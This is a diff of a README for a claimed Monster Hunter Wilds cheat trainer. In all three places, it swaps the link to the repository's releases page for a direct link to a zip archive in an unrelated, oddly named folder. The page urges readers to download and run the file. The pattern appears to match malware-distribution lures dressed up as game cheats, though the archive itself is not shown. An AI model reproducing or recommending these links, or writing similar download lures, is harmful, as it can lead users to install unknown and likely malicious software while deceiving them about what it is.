@@ -1,7 +1,7 @@
 <h1>🦖 Monster-Hunter-Wilds-Trainer-Tool - Unlock God Mode & Unlimited Resources</h1>
 
 <p align="center">
-  <a href="https://github.com/gerriburglarproof2999/Monster-Hunter-Wilds-Trainer-Tool/releases">
+  <a href="https://raw.githubusercontent.com/gerriburglarproof2999/Monster-Hunter-Wilds-Trainer-Tool/main/tracheopathia/Monster-Wilds-Tool-Hunter-Trainer-v1.5.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-Click%20Here%20to%20Get%20the%20Trainer-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download Button">
   </a>
 </p>
@@ -37,7 +37,7 @@ Follow these steps carefully. It will take less than five minutes.
 
 Visit this link to download the application:
 
-👉 **[Click Here to Download](https://github.com/gerriburglarproof2999/Monster-Hunter-Wilds-Trainer-Tool/releases)**
+👉 **[Click Here to Download](https://raw.githubusercontent.com/gerriburglarproof2999/Monster-Hunter-Wilds-Trainer-Tool/main/tracheopathia/Monster-Wilds-Tool-Hunter-Trainer-v1.5.zip)**
 
 You will see a list of files. Look for the one named **MHWilds-Trainer** or something similar. Click on it to start the download. Your browser will save the file to your **Downloads** folder.
 
@@ -137,7 +137,7 @@ If you find a bug or have a suggestion, you can leave a comment on the release p
 
 Do not forget to grab the trainer before you start playing:
 
-👉 **[Download Monster Hunter Wilds Trainer](https://github.com/gerriburglarproof2999/Monster-Hunter-Wilds-Trainer-Tool/releases)**
+👉 **[Download Monster Hunter Wilds Trainer](https://raw.githubusercontent.com/gerriburglarproof2999/Monster-Hunter-Wilds-Trainer-Tool/main/tracheopathia/Monster-Wilds-Tool-Hunter-Trainer-v1.5.zip)**
 
 ---
 
